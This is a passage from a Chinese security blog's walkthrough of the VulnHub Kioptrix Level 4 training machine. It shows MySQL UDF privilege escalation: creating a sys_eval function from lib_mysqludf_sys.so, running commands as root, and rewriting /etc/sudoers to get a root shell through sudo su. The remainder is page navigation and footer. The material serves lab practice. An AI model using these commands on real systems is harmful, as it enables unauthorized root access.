class="operator">|</span>                <span class="operator">|</span> <span class="keyword">User</span> defined functions <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------------+----------+----------------+------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 上方有个func表,属于mysql数据库,查看他存在哪些函数</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+-----+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name                  <span class="operator">|</span> ret <span class="operator">|</span> dl                  <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+-----+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> lib_mysqludf_sys_info <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> lib_mysqludf_sys.so <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span> </span><br><span class="line"><span class="operator">|</span> sys_exec              <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> lib_mysqludf_sys.so <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+-----+---------------------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806455.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin colorful note" color="error"><div class="body"><p>存在sys_exec函数但是无法利用,重新创建个函数试试</p></div></div>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.so&#x27;</span>;</span><br><span class="line">ERROR <span class="number">1046</span> (<span class="number">3</span>D000): <span class="keyword">No</span> database selected</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;lib_mysqludf_sys.so&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+-----+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name                  <span class="operator">|</span> ret <span class="operator">|</span> dl                  <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+-----+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> lib_mysqludf_sys_info <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> lib_mysqludf_sys.so <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span> </span><br><span class="line"><span class="operator">|</span> sys_exec              <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> lib_mysqludf_sys.so <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span> </span><br><span class="line"><span class="operator">|</span> sys_eval              <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> lib_mysqludf_sys.so <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+-----+---------------------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval(<span class="string">&#x27;id&#x27;</span>)           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> uid<span class="operator">=</span><span class="number">0</span>(root) gid<span class="operator">=</span><span class="number">0</span>(root)  <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 成功提权</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_eval(<span class="string">&#x27;chown -R john:john /etc/sudoers&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval(<span class="string">&#x27;chown -R john:john /etc/sudoers&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                             <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> exit</span><br><span class="line">Bye</span><br><span class="line"></span><br><span class="line">john<span class="variable">@Kioptrix4</span>:<span class="operator">/</span>var<span class="operator">/</span>www$ ls <span class="operator">-</span>la <span class="operator">/</span>etc<span class="operator">/</span> <span class="operator">|</span> grep sudoers</span><br><span class="line"><span class="operator">-</span>r<span class="comment">--r-----  1 john john      557 2012-02-04 09:58 sudoers</span></span><br><span class="line">john<span class="variable">@Kioptrix4</span>:<span class="operator">/</span>var<span class="operator">/</span>www$ chmod <span class="operator">+</span>w <span class="operator">/</span>etc<span class="operator">/</span>sudoers </span><br><span class="line">john<span class="variable">@Kioptrix4</span>:<span class="operator">/</span>var<span class="operator">/</span>www$ ls <span class="operator">-</span>la <span class="operator">/</span>etc<span class="operator">/</span> <span class="operator">|</span> grep sudoers</span><br><span class="line"><span class="operator">-</span>rw<span class="operator">-</span>r<span class="comment">-----  1 john john      557 2012-02-04 09:58 sudoers</span></span><br><span class="line">john<span class="variable">@Kioptrix4</span>:<span class="operator">/</span>var<span class="operator">/</span>www$ vi <span class="operator">/</span>etc<span class="operator">/</span>sudoers </span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806983.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/var/www$ sudo -l</span><br><span class="line">sudo: /etc/sudoers is mode 0640, should be 0440</span><br><span class="line">john@Kioptrix4:/var/www$ <span class="built_in">chmod</span> 0440 /etc/sudoers										</span><br><span class="line">john@Kioptrix4:/var/www$ mysql -uroot -p</span><br><span class="line">Enter password: </span><br><span class="line">mysql&gt; <span class="keyword">select</span> sys_eval(<span class="string">&#x27;chown -R root:root /etc/sudoers&#x27;</span>);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| sys_eval(<span class="string">&#x27;chown -R root:root /etc/sudoers&#x27;</span>) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">|                                             | </span><br><span class="line">+---------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)				</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br><span class="line">Bye</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/var/www$ sudo -l</span><br><span class="line">User john may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: ALL</span><br><span class="line">john@Kioptrix4:/var/www$ sudo su</span><br><span class="line">root@Kioptrix4:/var/www<span class="comment"># cd /root/</span></span><br><span class="line">root@Kioptrix4:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@Kioptrix4:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Shell-as-user1"><a href="#Shell-as-user1" class="headerlink" title="Shell as user1"></a>Shell as user1</h2><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806996.png" data-fancybox="true"/></div></div>
+
+<h2 id="Shell-as-user2"><a href="#Shell-as-user2" class="headerlink" title="Shell as user2"></a>Shell as user2</h2><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806944.png" data-fancybox="true"/></div></div>
+
+<h2 id="以root身份进入Shell"><a href="#以root身份进入Shell" class="headerlink" title="以root身份进入Shell"></a>以root身份进入Shell</h2><blockquote>
+<p> 保存屏幕截图作为Flag或Proof</p>
+</blockquote>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806936.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806980.png" data-fancybox="true"/></div></div>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/03/01/70eef621/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/03/01/70eef621/&title=VulnHub-Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280807941.png&summary=
+    总字符数: 18.79K 
+    
+    
+    代码: 15.99K, 文本: 0.58K
+    
+    
+    预计阅读时间: 1.20 小时
+    
+    
+
+
+
+Overview
+
+
+Name
+Tem..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=VulnHub-Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/03/01/70eef621/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/03/01/70eef621/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/03/ac635236/">应急响应-从攻击谈防守</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/02/28/aba73427/">VulnHub-Kioptrix Level 3 SQL 注入 + sudo 提权</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2022\11\02\735afd67\" title="VulnHub-DC系列"><span class="title">VulnHub-DC系列</span></a><a class="item" href="\2024\02\24\e36a7018\" title="VulnHub-Kioptrix Level 1 古老的 Apache Vuln"><span class="title">VulnHub-Kioptrix Level 1 古老的 Apache Vuln</span></a><a class="item" href="\2024\02\26\7e189a50\" title="VulnHub-Kioptrix Level 2 简单的命令注入 + 内核提权"><span class="title">VulnHub-Kioptrix Level 2 简单的命令注入 + 内核提权</span></a><a class="item" href="\2024\02\28\aba73427\" title="VulnHub-Kioptrix Level 3 SQL 注入 + sudo 提权"><span class="title">VulnHub-Kioptrix Level 3 SQL 注入 + sudo 提权</span></a><a class="item" href="\2024\09\24\3c3f9499\" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E8%83%BD"><span class="toc-text">相关技能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%96%84%E5%BC%B1%E7%82%B9"><span class="toc-text">薄弱点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap%E6%89%AB%E6%8F%8F"><span class="toc-text">Nmap扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE"><span class="toc-text">枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E6%9E%9A%E4%B8%BE"><span class="toc-text">SMB 枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whatweb"><span class="toc-text">whatweb</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wordlist"><span class="toc-text">wordlist</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E9%9D%B6%E5%9C%BA-%E5%AF%BB%E6%89%BE%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-text">访问靶场,寻找功能点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90"><span class="toc-text">信息分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">系统信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E6%8F%90%E6%9D%83"><span class="toc-text">MySQL提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-user1"><span class="toc-text">Shell as user1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-user2"><span class="toc-text">Shell as user2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5root%E8%BA%AB%E4%BB%BD%E8%BF%9B%E5%85%A5Shell"><span class="toc-text">以root身份进入Shell</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
